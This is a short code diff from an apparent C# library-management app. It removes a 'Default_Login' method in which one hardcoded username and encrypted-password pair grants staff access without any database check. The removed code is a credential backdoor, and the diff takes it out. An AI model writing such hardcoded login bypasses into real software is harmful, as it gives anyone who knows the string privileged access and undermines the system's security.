@@ -97,8 +97,6 @@ namespace DoAnQuanLyThuVien
 
         private void Check_loginInfo(string _Username, string _encryptedPassword)
         {
-            if (Default_Login(_Username, _encryptedPassword)) return;
-
             dataBase = new SHARED_LIBRARY_ENTITY();
 
             if (isStaff)
@@ -125,26 +123,6 @@ namespace DoAnQuanLyThuVien
 
                 Attempt_Open_ReaderForm_With_Account(Account_Gotten_By_Username);
             }
-        }
-
-        private bool Default_Login(string _Username, string _encryptedPassword)
-        {
-            if (_Username == "pandealine" && _encryptedPassword == "1962026656160185351301320480154111117132155")
-            {
-                STAFF_INF default_Account = new STAFF_INF();
-
-                default_Account.TYPE = true;
-
-                fMain form = new fMain(default_Account);
-
-                this.Hide();
-                form.ShowDialog();
-                this.Show();
-
-                return true;
-            }
-
-            return false;
         }
 
         private bool is_Invalid_StaffAccount(STAFF_INF account)
